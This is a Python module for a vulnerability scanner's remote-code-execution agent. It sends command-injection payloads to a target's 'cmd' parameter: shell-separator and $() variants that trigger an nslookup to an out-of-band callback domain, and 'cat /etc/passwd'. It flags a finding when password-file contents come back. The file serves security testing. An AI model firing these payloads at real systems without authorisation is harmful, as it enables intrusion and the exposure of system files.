# agents/specialists/rce_specialist.py
import logging
import uuid
from typing import List

import aiohttp

from agents.specialist_base import ISpecialist, OOBMixin
from core.types import MultiSessionContext, TargetScope, VulnCategory
from triage.noise_filter import Finding

logger = logging.getLogger(__name__)


class RCESpecialist(OOBMixin, ISpecialist):
    """Remote Code Execution (RCE) specialist agent."""

    @property
    def category(self) -> VulnCategory:
        return VulnCategory.RCE

    async def scan(
        self,
        target: str,
        scope: TargetScope,
        session_ctx: MultiSessionContext,
        correlation_id: str,
    ) -> List[Finding]:
        findings = []

        if await self.check_false_positive(target):
            return findings

        oob_payload = self.embed_oob_payload(context={
            "endpoint": target,
            "category": self.category.value,
            "correlation_id": correlation_id,
        })

        payloads = [
            f"; nslookup {oob_payload} ;",
            f"| nslookup {oob_payload} |",
            f"$(nslookup {oob_payload})",
            "cat /etc/passwd",
        ]

        async with aiohttp.ClientSession() as session:
            for p in payloads:
                test_url = f"{target}?cmd={p}"
                try:
                    async with session.get(test_url, timeout=10) as response:
                        body = await response.text()
                        if "root:x:" in body:
                            finding = Finding(
                                finding_id=f"rce_{uuid.uuid4().hex[:8]}",
                                title="Remote Code Execution Confirmed via Error/Command output",
                                description=f"Executed command successfully, system file returned.",
                                vuln_category=self.category.value,
                                endpoint=target,
                                evidence={
                                    "payload": p,
                                    "oob_payload": oob_payload,
                                    "url": test_url,
                                    "response": body[:200],
                                },
                                confidence=0.95,
                            )
                            findings.append(finding)
                except Exception as e:
                    logger.warning(f"Error requesting {test_url}: {e}")

        return findings
